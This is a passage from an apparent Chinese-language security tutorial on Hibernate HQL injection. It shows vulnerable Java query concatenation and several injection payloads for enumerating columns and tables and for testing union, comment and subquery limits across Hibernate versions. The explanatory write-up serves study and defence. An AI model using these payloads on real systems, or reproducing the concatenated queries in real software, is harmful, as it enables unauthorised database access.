</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>mysql-connector-java<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>8.0.33<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;groupId&gt;</span>javax.servlet<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;artifactId&gt;</span>javax.servlet-api<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;version&gt;</span>4.0.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&lt;scope&gt;</span>provided<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/dependencies&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/project&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="hql语句注入" class="heading-element"><span>HQL语句注入</span>
  <a href="#hql%e8%af%ad%e5%8f%a5%e6%b3%a8%e5%85%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>HQL注入就是利用Hibernate框架产生的注入点，Hibernate 中没有对数据进行有效的验证导致恶意数据进入应用程序中造成的。</p>
<p>按照查询方式不同也分为两种注入：原生SQL语句注入 和 HQL语句注入</p>
<p><strong>原生SQL语句注入</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">parameter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">createSQLQuery</span><span class="p">(</span><span class="s">&#34;SELECT table_name FROM information_schema.tables where table_schema=&#39;&#34;</span><span class="o">+</span><span class="n">parameter</span><span class="o">+</span><span class="s">&#34;&#39;&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这种因为使用的数据库原生的语句，使用对应数据库SQL语句进行拼接注入即可，无任何限制，这里不做讨论。</p>
<p>在Hibernate 5.2.5.Final 版本中<code>createSQLQuery</code>被弃用了</p>
<p><strong>HQL语句注入</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">parameter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="o">&lt;</span><span class="n">User</span><span class="o">&gt;</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">session</span><span class="p">.</span><span class="na">createQuery</span><span class="p">(</span><span class="s">&#34;from User where name=&#39;&#34;</span><span class="o">+</span><span class="w"> </span><span class="n">parameter</span><span class="w"> </span><span class="o">+</span><span class="s">&#34;&#39;&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">User</span><span class="p">.</span><span class="na">class</span><span class="p">);</span></span></span></code></pre></td></tr></table>
</div>
</div><p>HQL语句执行逻辑：</p>
<ol>
<li>Hibernate框架首先会去解析<code>createQuery()</code>函数中语句是否符合HQL语法，不符合则会触发HQL语法错误；</li>
<li>符合HQL语法后，HQL框架引擎会将其解析成对应数据库的原生SQL语句；</li>
<li>将原生SQL语句去数据库中进行查询获取结果，此时原生SQL语句如果不正确则会导致数据库层面的报错（不同数据库则是不同的报错了）</li>
</ol>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312142010145.png" alt="image-20250312142010145" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312142010145.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312142010145.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312142010145.png?size=large 2x" data-title="image-20250312142010145" style="--width: 2060px;--aspect-ratio: 2060 / 1716;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>图中上面是HQL语法的语句、下面则是HQL引擎转换的mysql数据库的SQL语句。</p>
<p>因此上述过程会有两种错误消息来源，一种来自hibernate引擎，一种来自后端数据库。</p>
<h3 id="判断注入点" class="heading-element"><span>判断注入点</span>
  <a href="#%e5%88%a4%e6%96%ad%e6%b3%a8%e5%85%a5%e7%82%b9" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>可以通过插入特殊字符方式，尝试触发上述两种报错。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;
</span></span><span class="line"><span class="cl">()
</span></span><span class="line"><span class="cl">特殊字符/Unicode</span></span></code></pre></td></tr></table>
</div>
</div><p>如果出现 <code>org.hibernate.exception</code> 报错，则后端使用了 hibernate 框架。</p>
<p>HQL注入</p>
<h3 id="hql基础注入" class="heading-element"><span>HQL基础注入</span>
  <a href="#hql%e5%9f%ba%e7%a1%80%e6%b3%a8%e5%85%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>基础注入方式就是猜测表名、列名去查询数据，这部分主要依靠字典的能力</p>
<p>1、如果有报错信息的话，那就根据报错回显去看表名、列名，根据表名进行盲注或报错注入查询数据。或者根据回显去猜测可能存在的表名和列名，然后进行查询数据</p>
<p>2、如果没有报错信息的话</p>
<p>使用and或or进行列名的枚举</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=mysql&#39; or xxxxx = &#39;1</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151338133.png" alt="image-20250312151338133" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151338133.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151338133.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151338133.png?size=large 2x" data-title="image-20250312151338133" style="--width: 1418px;--aspect-ratio: 1418 / 760;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151352497.png" alt="image-20250312151352497" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151352497.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151352497.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151352497.png?size=large 2x" data-title="image-20250312151352497" style="--width: 1420px;--aspect-ratio: 1420 / 740;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>使用子查询进行表名枚举</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=mysql&#39;or+(select+1+from+XXXX+where+1=2)=&#39;1</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151247584.png" alt="image-20250312151247584" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151247584.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151247584.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151247584.png?size=large 2x" data-title="image-20250312151247584" style="--width: 1408px;--aspect-ratio: 1408 / 784;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151259504.png" alt="image-20250312151259504" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151259504.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151259504.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312151259504.png?size=large 2x" data-title="image-20250312151259504" style="--width: 1416px;--aspect-ratio: 1416 / 808;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>主要还是拼的字典的好坏。</p>
<h2 id="hql注入限制" class="heading-element"><span>HQL注入限制</span>
  <a href="#hql%e6%b3%a8%e5%85%a5%e9%99%90%e5%88%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>HQL注入的一大挑战是注入模式非常有限，其没有联合语句，没有函数来创建简单延迟，没有系统函数，没有可用的元数据表等。</p>
<p>Hibernate查询语言没有那些在后台数据库中可能存在的功能特性。</p>
<p>用具体案例看一下</p>
<p>1、正常查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=test</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143359738.png" alt="image-20250312143359738" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143359738.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143359738.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143359738.png?size=large 2x" data-title="image-20250312143359738" style="--width: 1492px;--aspect-ratio: 1492 / 692;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="union限制" class="heading-element"><span>union限制</span>
  <a href="#union%e9%99%90%e5%88%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>union查询在5.6.15版本及其之前不支持</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">name=test&#39; union select 1,2,&#39;3   #报错</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143322181.png" alt="image-20250312143322181" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143322181.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143322181.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143322181.png?size=large 2x" data-title="image-20250312143322181" style="--width: 1560px;--aspect-ratio: 1560 / 930;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>6.x版本开始支持union查询，但是也只能利用HQL语法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">name=mysql&#39; union from User where &#39;1&#39;=&#39;1</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="注释限制" class="heading-element"><span>注释限制</span>
  <a href="#%e6%b3%a8%e9%87%8a%e9%99%90%e5%88%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>多行注释/**/，在5.6.15版本之前不支持，在6.0.1开始支持多行注释</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=test&#39;+and/**/&#39;1&#39;=&#39;1				#5.6.15报错</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143940292.png" alt="image-20250312143940292" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143940292.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143940292.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312143940292.png?size=large 2x" data-title="image-20250312143940292" style="--width: 1506px;--aspect-ratio: 1506 / 762;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>不能使用单行注释<code>#</code>或<code>+--+</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=test&#39;+and+&#39;1&#39;=&#39;1&#39;+--+       #报错
</span></span><span class="line"><span class="cl">?name=test&#39;+and+&#39;1&#39;=&#39;1&#39;%23        #报错</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144355596.png" alt="image-20250312144355596" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144355596.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144355596.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144355596.png?size=large 2x" data-title="image-20250312144355596" style="--width: 1370px;--aspect-ratio: 1370 / 740;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144438556.png" alt="image-20250312144438556" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144438556.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144438556.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144438556.png?size=large 2x" data-title="image-20250312144438556" style="--width: 1408px;--aspect-ratio: 1408 / 712;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="子查询限制" class="heading-element"><span>子查询限制</span>
  <a href="#%e5%ad%90%e6%9f%a5%e8%af%a2%e9%99%90%e5%88%b6" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>可以使用子查询，但必须是HQL已经映射的表和字段</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=test&#39; and (select name from User where id=1)=&#39;test</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144933941.png" alt="image-20250312144933941" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144933941.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144933941.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312144933941.png?size=large 2x" data-title="image-20250312144933941" style="--width: 1408px;--aspect-ratio: 1408 / 696;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>未映射的表不能查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">name=test&#39; and (select id from test1 where id=1)=&#39;1        #报错</span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312145251921.png" alt="image-20250312145251921" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312145251921.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312145251921.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312145251921.png?size=large 2x" data-title="image-20250312145251921" style="--width: 1424px;--aspect-ratio: 1424 / 874;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>未映射的字段名不能查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">name=test&#39; and (select newname from User where id=1)=&#39;1     #报错</span></span></code></pre></td></tr></table>
</div>
